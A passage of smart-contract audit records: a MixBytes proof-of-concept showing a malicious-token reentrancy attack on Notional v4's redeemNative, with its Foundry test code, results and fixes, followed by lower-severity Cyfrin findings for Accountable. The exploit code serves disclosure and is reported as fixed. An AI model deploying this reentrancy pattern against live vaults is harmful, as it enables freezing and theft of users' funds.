TestBug2Instant is TestMorphoYieldStrategy {\n    struct UniV2Data { address[] path; }\n    address attacker;\n    address maliciousToken;\n\n    address[] routeRedeem;\n\n    function deployYieldStrategy() internal override {\n        setupWithdrawRequestManager(address(\n            new EtherFiWithdrawRequestManager()\n        ));\n        y = new MockStakingStrategy(address(WETH), address(weETH), 0.0010e18);\n\n        w = ERC20(y.yieldToken());\n        (AggregatorV2V3Interface oracle, ) = TRADING_MODULE.priceOracles(\n            address(w)\n        );\n        \n        o = new MockOracle(oracle.latestAnswer());\n\n        defaultDeposit = 10e18;\n        defaultBorrow = 90e18;\n        maxEntryValuationSlippage = 0.0050e18;\n        maxExitValuationSlippage = 0.0050e18;\n\n        withdrawRequest = new TestEtherFiWithdrawRequest();\n        canInspectTransientVariables = true;\n    }\n\n    function postDeploySetup() internal override {\n        // Set permissions to trade\n        vm.startPrank(owner);\n        TRADING_MODULE.setTokenPermissions(\n            address(y),\n            address(weETH),\n            ITradingModule.TokenPermissions(\n            { allowSell: true, dexFlags: uint32(1 << uint8(DexId.UNISWAP_V2)),\n             tradeTypeFlags: 5 }\n        ));\n        vm.stopPrank();\n\n        attacker = _createUser(\"attacker\");\n        \n        // weETH whale\n        vm.startPrank(0xBdfa7b7893081B35Fb54027489e2Bc7A38275129); \n        weETH.transfer(attacker, 10_000e18);\n        vm.stopPrank();\n\n        // Create UniswapV2 route with malicious token\n        vm.startPrank(attacker);\n        maliciousToken = address(new MaliciousToken(\n            address(lendingRouter),\n            attacker,\n            address(y)\n        ));\n        routeRedeem.push(address(weETH));\n        routeRedeem.push(maliciousToken);\n        routeRedeem.push(address(WETH));\n\n        address uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n        WETH.deposit{value: 100e18}();\n        WETH.approve(uniRouter, type(uint256).max);\n        weETH.approve(uniRouter, type(uint256).max);\n        IERC20(maliciousToken).approve(uniRouter, type(uint256).max);\n\n        IUniswapV2Router01(uniRouter).addLiquidity(\n            routeRedeem[0],\n            routeRedeem[1],\n            100e18,\n            110e18,\n            0,\n            0,\n            attacker,\n            block.timestamp\n        );\n\n        IUniswapV2Router01(uniRouter).addLiquidity(\n            routeRedeem[1],\n            routeRedeem[2],\n            100e18,\n            100e18,\n            0,\n            0,\n            attacker,\n            block.timestamp\n        );\n\n        // Allow token to initiate withdraw on behalf of attacker\n        lendingRouter.setApproval(maliciousToken, true);\n\n        vm.stopPrank();\n    }\n\n    function getRedeemData(\n        address /* user */,\n        uint256 /* shares */\n    ) internal view override returns (bytes memory redeemData) {\n        // Calldata for instant redemption\n        return abi.encode(RedeemParams({\n            minPurchaseAmount: 0,\n            dexId: uint8(DexId.UNISWAP_V2),\n            exchangeData: abi.encode(\n                UniV2Data({\n                path: routeRedeem\n                })\n            )\n        }));\n    }\n\n    function _createUser(string memory name) internal returns (address user) {\n        user = makeAddr(name);\n        vm.label(user, name);\n\n        // Give initial funds to user\n        vm.deal(user, 1000e18);\n\n        vm.startPrank(owner);\n        asset.transfer(user, 10_000e18);\n        vm.stopPrank();\n    }\n\n    function test_reentrancy_redeemNative_initiateWithdraw_instant() \n        external\n        onlyIfWithdrawRequestManager \n    {\n        address user = _createUser(\"user\");\n        address user2 = _createUser(\"user2\");\n        address liquidator = _createUser(\"liquidator\");\n\n        // Initial state of the vault with having some yield tokens\n        _enterPosition(user2, defaultDeposit, 0);\n\n        // Attacker enters position before liquidation\n        _enterPosition(attacker, defaultDeposit / 10, defaultBorrow / 20);\n\n        console.log(\"Before liquidation - s_yieldTokenBalance:\",\n                    MockStakingStrategy(address(y))._s_yieldTokenBalance());\n        console.log(\"Before liquidation - yield token balance:\",\n                    ERC20(y.yieldToken()).balanceOf(address(y)));\n        console.log(\"Before liquidation - share total supply:\",\n                    y.totalSupply());\n        console.log(\"Before liquidation - share price attacker:\",\n                    y.price(attacker));\n        console.log(\"Before liquidation - share price user2:\",\n                    y.price(user2));\n        (uint256 borrowed, uint256 collateralValue, uint256 maxBorrow) =\n            lendingRouter.healthFactor(user2, address(y));\n        console.log(\"Before liquidation - collateralValue:\", collateralValue);\n        console.log(\"Before liquidation - maxBorrow:\", maxBorrow);\n\n        int256 initialPrice = o.latestAnswer();\n\n        // Perform liquidation (liquidator is different account of attacker)\n        uint256 sharesToLiquidator = _liquidate(user, liquidator);\n\n        // Return initial price of collateral (just for clarity)\n        o.setPrice(initialPrice);\n\n        console.log(\"After liquidation - s_yieldTokenBalance:\",\n                    MockStakingStrategy(address(y))._s_yieldTokenBalance());\n        console.log(\"After liquidation - yield token balance:\",\n                    ERC20(y.yieldToken()).balanceOf(address(y)));\n        console.log(\"After liquidation - share total supply:\",\n                    y.totalSupply());\n        console.log(\"After liquidation - share price attacker:\",\n                    y.price(attacker));\n        console.log(\"After liquidation - share price user2:\",\n                    y.price(user2));\n        (borrowed, collateralValue, maxBorrow) = lendingRouter.healthFactor(\n            user2, \n            address(y)\n        );\n        console.log(\"After liquidation - collateralValue:\", collateralValue);\n        console.log(\"After liquidation - maxBorrow:\", maxBorrow);\n\n        console.log(\"Shares balance of attacker\",\n                    lendingRouter.balanceOfCollateral(attacker, address(y)));\n        console.log(\"Shares balance of liquidator\",\n                    y.balanceOf(liquidator));\n\n        // Perform reentrancy\n        vm.startPrank(liquidator);\n        y.redeemNative(sharesToLiquidator, getRedeemData(\n            liquidator, \n            sharesToLiquidator)\n        );\n        checkTransientsCleared();\n        vm.stopPrank();\n\n        console.log(\"After attack - s_yieldTokenBalance:\",\n                    MockStakingStrategy(address(y))._s_yieldTokenBalance());\n        console.log(\"After attack - yield token balance:\",\n                    ERC20(y.yieldToken()).balanceOf(address(y)));\n        console.log(\"After attack - share total supply:\",\n                    y.totalSupply());\n        console.log(\"After attack - share price attacker:\",\n                    y.price(attacker));\n        console.log(\"After attack - share price user2:\",\n                    y.price(user2));\n        (borrowed, collateralValue, maxBorrow) = lendingRouter.healthFactor(\n            user2, \n            address(y)\n        );\n        console.log(\"After attack - collateralValue:\", collateralValue);\n        console.log(\"After attack - maxBorrow:\", maxBorrow);\n    }\n\n    function _liquidate(address user, address liquidator) \n        internal returns (uint256 sharesToLiquidator) \n    {\n        _enterPosition(user, defaultDeposit, defaultBorrow);\n        uint256 balanceBefore = lendingRouter.balanceOfCollateral(\n            user,\n            address(y)\n        );\n\n        // Drop the collateral price to make position unhealthy\n        o.setPrice(o.latestAnswer() * 0.85e18 / 1e18);\n\n        // Liquidate the position\n        vm.warp(block.timestamp + 6 minutes);\n\n        vm.startPrank(liquidator);\n        asset.approve(address(lendingRouter), type(uint256).max);\n        uint256 assetBefore = asset.balanceOf(liquidator);\n        sharesToLiquidator = lendingRouter.liquidate(\n            user, \n            address(y), \n            balanceBefore, \n            0\n        );\n        uint256 assetAfter = asset.balanceOf(liquidator);\n        uint256 netAsset = assetBefore - assetAfter;\n\n        uint256 balanceAfter = lendingRouter.balanceOfCollateral(\n            user, \n            address(y)\n        );\n        assertEq(balanceAfter, balanceBefore - sharesToLiquidator);\n        assertEq(y.balanceOf(liquidator), sharesToLiquidator);\n        vm.stopPrank();\n    }\n}\n\ncontract MaliciousToken is ERC20(\"Malicious\", \"TKN\") {\n\n    uint count;\n    address onBehalf;\n    address vault;\n    address lr;\n\n    constructor(address lr_, address onBehalf_, address vault_) {\n        _mint(msg.sender, 100000e18);\n\n        lr = lr_;\n        onBehalf = onBehalf_;\n        vault = vault_;\n    }\n\n    function transfer(address to, uint256 value) {\n        public\n        override\n        returns (bool)\n    {\n        // Reenter only once\n        if (count == 0) {\n            ILendingRouter(lr).initiateWithdraw(onBehalf, vault, \"\");\n        }\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        count = count + 1;\n        return true;\n    }\n}\n\ninterface IUniswapV2Router01 {\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n}\n```\n\nThe results of the test are as follows:\n\n```\nBefore liquidation - s_yieldTokenBalance: 14414159849677474491\nBefore liquidation - yield token balance: 14414159849677474491\nBefore liquidation - share total supply: 14414159849677474491000000\nBefore liquidation - share price attacker: 1071991787524217088000000000000\nBefore liquidation - share price user2: 1071991787524217088000000000000\nBefore liquidation - collateralValue: 9968942569622939455\nBefore liquidation - maxBorrow: 9121582451204989601\nAfter liquidation - s_yieldTokenBalance: 107408739525016019612\nAfter liquidation - yield token balance: 107408739525016019612\nAfter liquidation - share total supply: 107408739525016019612000000\nAfter liquidation - share price attacker: 1071991775286867985000000000000\nAfter liquidation - share price user2: 1071991775286867985000000000000\nAfter liquidation - collateralValue: 9968942455822225838\nAfter liquidation - maxBorrow: 9121582347077336641\nShares balance of attacker 5114701882143619980000000\nShares balance of liquidator 92994579675338545121000000\nAfter attack - s_yieldTokenBalance: 4184757263746203114\nAfter attack - yield token balance: 9299459087502815641\nAfter attack - share total supply: 14414159849677474491000000\nAfter attack - share price attacker: 1071991775286867985000000000000\nAfter attack - share price user2: 482396298879090593000000000000\nAfter attack - collateralValue: 4486024105120001625\nAfter attack - maxBorrow: 4104712056184801486\n```\n\nWe see that `s_yieldTokenBalance` is twice less than yield token balance after attack, and `collateralValue` and `maxBorrow` of attacked position holder is decreased more than 2 times, though they didn't change their position themselves.\n\nThis issue is classified as **Critical** severity because it allows a malicious actor to corrupt accounting, freeze user funds inside the vault, distort share pricing, and potentially cause cascading liquidations leading to systemic protocol failure.\n\n##### Recommendation\nWe recommend making the following changes:\n1. Add a `nonReentrant` guard to all external entry points that can be reached during redemption and accounting updates, including lending router functions, and functions in request manager such as `initiateWithdraw()` and `finalize()`. We would also suggest to add guard to as much external functions of the protocol as possible, to eliminate attack possibility totally.\n2. Validate `exchangeData` for Uniswap V2 trades and enforce that the path contains exactly **two tokens** (single-hop swap) to prevent insertion of arbitrary intermediary tokens that can perform reentrancy during transfer.\n\n> **Client's Commentary:** \n> Fixed here: https://github.com/notional-finance/notional-v4/pull/34/commits/abcd6bef62b2c53cc8f680b92c8554a1a0474c4e\n\n---\n",
      "summary": "\nThe report describes a bug in the redemption process of the AbstractYieldStrategy contract. This bug allows a malicious actor to exploit the system and freeze a portion of the vault's yield tokens, corrupting internal accounting and potentially causing liquidations. The vulnerability is caused by a reentrancy issue in the redeemNative() function, which calls other functions that are not protected against reentrancy. This allows the attacker to reenter and call functions that can manipulate the system during the redemption process. To fix this, the report recommends adding a nonReentrant guard to all external entry points and validating the exchangeData for Uniswap V2 trades to prevent insertion of malicious tokens. The severity of this bug is classified as critical, and the client has already implemented the recommended changes to fix it.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#1-redeemnative-reentrancy-enables-permanent-fund-freeze-systemic-misaccounting-and-liquidation-cascades",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63000",
      "title": "Storage read optimizations",
      "impact": "GAS",
      "content": "**Description:**\n1. [`AccountableOpenTerm::_calculateRequiredLiquidity`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L642-L655): `vault` and `_scaleFactor` can be cached. Also consider changing so that `_calculateRequiredLiquidity` takes `address vault_` as a parameter. That would allow to cache the   `vault` read in the [`_isDelinquent`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L492-L497), [`_getAvailableLiquidity`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L658-L663), [`_borrowable`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L518-L523) and [`_validateLiquidityForTermChange`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L526-L533) flows as well.\n\n2. [`AccountableOpenTerm::_getAvailableLiquidityForProcessing`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L666-L671): `vault` can be cached. Also consider same as above, add `address vault_` as a parameter, then use a cached value from [`_processAvailableWithdrawals`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L536-L570).\n\n3. [`AccountableOpenTerm::_penaltyFee`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L587-L599), use the cached value `gracePeriod` on [L595](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L595)\n\n4. [`AccountableOpenTerm::supply`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L238-L244): `vault` can be cached\n\n5. [`AccountableOpenTerm::repay`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableOpenTerm.sol#L260-L272): `vault` can be cached.\n\n6. [`AccountableFixedTerm::_sharePrice`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableFixedTerm.sol#L533-L540): `loanState` can be cached.\n\n7. [`AccountableStrategy::acceptBorrowerRole`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L181-L189): Use `msg.sender` instead of `pendingBorrower` on [L185](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L185) and instead of `borrower` on [L188](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L188)\n\n8. [`AccountableStrategy::_requireLoanNotOngoing`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L474-L476): `loanState` can be cached.\n\n9. [`AccountableStrategy::_requireLoanOngoing`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableStrategy.sol#L479-L481): `loanState` can be cached.\n\n10. [AccountableWithdrawalQueue::_push](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L82-L84): Set `_queue.nextRequestId` to `1` at construction and remove the if to save a read each `_push`.\n\n11. [`AccountableAsyncRedeemVault::redeem`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L155-L156): `state.redeemPrice` can be cached\n\n12. [`AccountableAsyncRedeemVault::withdraw`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L176-L177): `state.withdrawPrice` can be cached.\n\n13. [`AccountableAsyncRedeemVault::_updateRedeemState`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L197-L201): `state.maxWithdraw` and `state.redeemShares` can be cached.\n\n14. [`AccountableAsyncRedeemVault::_fulfillRedeemRequest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L305-L326): `state.pendingRedeemRequest`, `state.maxWithdraw` and `state.redeemShares` can be cached.\n\n15. [`AccountableAsyncRedeemVault::maxRedeem`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L352-L356) and [AccountableAsyncRedeemVault::maxWithdraw](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/AccountableAsyncRedeemVault.sol#L359-L363): Can be rewritten as:\n    ```solidity\n    function maxWithdraw(address receiver) public view override returns (uint256 maxAssets) {\n        VaultState storage state = _vaultStates[receiver];\n        maxAssets = state.maxWithdraw;\n        if (state.redeemShares == 0) return 0;\n    }\n    ```\n\n16. [`Authorizable::_verify`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/access/Authorizable.sol#L47-L75): `signer` can be cached.\n\n17. [`RewardsDistributorMerkle::acceptRoot`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/rewards/RewardsDistributorMerkle.sol#L67-L68): `_pendingRoot.validAt` can be cached.\n\n18. [`RewardsDistributorMerkle::claim`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/rewards/RewardsDistributorMerkle.sol#L100-L102): `claimed[account][asset])` can be cached\n\n19. [`RewardsDistributorStrategy::claim`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/rewards/RewardsDistributorStrategy.sol#L40-L42): `claimed[account][asset])` can be cached\n\n\n**Accountable:** Most fixed in commit [`8e1cfa2`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/8e1cfa29de4dc4b0198e26e59acb56e7c929dbcf)\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62999",
      "title": "State changes without events",
      "impact": "LOW",
      "content": "There are state variable changes in this function but no event is emitted. Consider emitting an event to enable offchain indexers to track the changes.\n\n- [Line: 47](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/modules/GlobalRegistry.sol#L47)\n\n\t```solidity\n\t    function setSecurityAdmin(address securityAdmin_) external onlyOwner {\n\t```\n\n- [Line: 53](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/modules/GlobalRegistry.sol#L53)\n\n\t```solidity\n\t    function setOperationsAdmin(address operationsAdmin_) external onlyOwner {\n\t```\n\n- [Line: 59](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/modules/GlobalRegistry.sol#L59)\n\n\t```solidity\n\t    function setTreasury(address treasury_) external onlyOwner {\n\t```\n\n- [Line: 65](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/modules/GlobalRegistry.sol#L65)\n\n\t```solidity\n\t    function setVaultFactory(address vaultFactory_) external onlyOwner {\n\t```\n\n- [Line: 71](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/modules/GlobalRegistry.sol#L71)\n\n\t```solidity\n\t    function setRewardsFactory(address rewardsFactory_) external onlyOwner {\n\t```\n\n**Accountable:** Fixed in commit [`13600f4`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/13600f460f9796f16d151d19dc4a1d5c35c1475d)\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62998",
      "title": "Unused errors",
      "impact": "LOW",
      "content": "The following errors in) `https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol` are unused. Consider using or removing the unused error.\n\n\n- [Line: 15](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L15) `error InvalidVerifier();`\n\n- [Line: 18](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L18) `error InvalidExpiration();`\n\n- [Line: 27](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L27) `error UnauthorizedOwnerOrReceiver();`\n\n- [Line: 30](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L30) `error UnauthorizedController();`\n\n- [Line: 45](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L45) `error AccountAlreadyVerified();`\n\n- [Line: 49](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L49) `error NotAdminOrOperator(address account);`\n\n- [Line: 52](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L52) `error Paused(address account);`\n\n- [Line: 59](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L59) `error CancelDepositRequestPending();`\n\n- [Line: 65](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L65) `error DepositRequestWasCancelled();`\n\n- [Line: 71](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L71) `error ExceedsDepositLimit();`\n\n- [Line: 89](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L89) `error NoDepositRequest();`\n\n- [Line: 95](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L95) `error NoPendingDepositRequest();`\n\n- [Line: 101](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L101) `error NoCancelDepositRequest();`\n\n- [Line: 113](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L113) `error ProposalExpired();`\n\n- [Line: 116](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L116) `error NoPendingProposal();`\n\n- [Line: 122](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L122) `error AlreadyInQueue();`\n\n- [Line: 141](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L141) `error LoanAlreadyAccepted();`\n\n- [Line: 153](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L153) `error LoanInDefault();`\n\n- [Line: 162](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L162) `error LoanNotAcceptedByBorrower();`\n\n- [Line: 168](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L168) `error ZeroSharePrice();`\n\n- [Line: 177](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L177) `error LoanNotRepaid();`\n\n- [Line: 186](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L186) `error PaymentNotDue();`\n\n- [Line: 192](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L192) `error RequestDepositFailed();`\n\n- [Line: 195](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L195) `error RequestRedeemFailed();`\n\n- [Line: 210](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L210) `error BorrowerNotSet();`\n\n- [Line: 213](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L213) `error PriceOracleNotSet();`\n\n- [Line: 216](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/constants/Errors.sol#L216) `error RewardsDistributorNotSet();`\n\n**Accountable:** Errors removed in commit [`18ce919`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/18ce919d1771bdb0951e3601c667e5608957122c)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62997",
      "title": "`nonReentrant` is not the first modifier",
      "impact": "LOW",
      "content": "**Description:** In `FeeManager::withdrawProtocolFee`, `nonReentrant` is not the first modifier. To protect against reentrancy in other modifiers, the `nonReentrant` modifier should be the first modifier in the list of modifiers. Consider putting `nonReentrant` first for consistent reentrancy protection.\n\n**Accountable:** Fixed in commit [`c7f31b5`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/c7f31b51fc1bfb4fe96450a189751f6f72d8274d)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62996",
      "title": "ERC20 zero amount transfer rejection",
      "impact": "LOW",
      "content": "**Description:** The `_checkTransfer` function reverts on zero-amount transfers, violating ERC-20 standard which mandates that transfers of 0 values [MUST be treated](https://eips.ethereum.org/EIPS/eip-20#transfer) as normal transfers.\n\n**Impact:** Violation of `eip20_transferSupportZeroAmount` and `eip20_transferFromSupportZeroAmount`.\n\n**Proof of Concept:** ❌ Violated: https://prover.certora.com/output/52567/9c9c3c73f4d64f9baf1284ced4f4a8f5/?anonymousKey=160f0b0d10e3f688f1981708e4aa3819e7023a80\n\n```solidity\n// EIP20-06: Verify transfer() handles zero amount transfers correctly\n// EIP-20: \"Transfers of 0 values MUST be treated as normal transfers and fire the Transfer event.\"\nrule eip20_transferSupportZeroAmount(env e, address to, uint256 amount) {\n\n    setup(e);\n\n    // Perform transfer\n    transfer(e, to, amount);\n\n    // Zero amount transfers must succeed\n    satisfy(amount == 0);\n}\n\n// EIP20-09: Verify transferFrom() handles zero amount transfers correctly\n// EIP-20: \"Transfers of 0 values MUST be treated as normal transfers and fire the Transfer event.\"\nrule eip20_transferFromSupportZeroAmount(env e, address from, address to, uint256 amount) {\n\n    setup(e);\n\n    // Perform the transferFrom\n    transferFrom(e, from, to, amount);\n\n    // Zero amount transferFrom must succeed\n    satisfy(amount == 0);\n}\n```\n\n✅ Verified after the fix: https://prover.certora.com/output/52567/0babf2c2b4da49ec87cc0ae00036b0e7/?anonymousKey=21b1c4b60901ee2fea0115aa8a1b0e621c04bfaa\n\n**Recommended Mitigation:**\n```diff\ndiff --git a/credit-vaults-internal/src/vault/AccountableVault.sol b/credit-vaults-internal/src/vault/AccountableVault.sol\nindex 629b6d0..fb3676a 100644\n--- a/credit-vaults-internal/src/vault/AccountableVault.sol\n+++ b/credit-vaults-internal/src/vault/AccountableVault.sol\n@@ -141,7 +141,8 @@ abstract contract AccountableVault is IAccountableVault, ERC20, 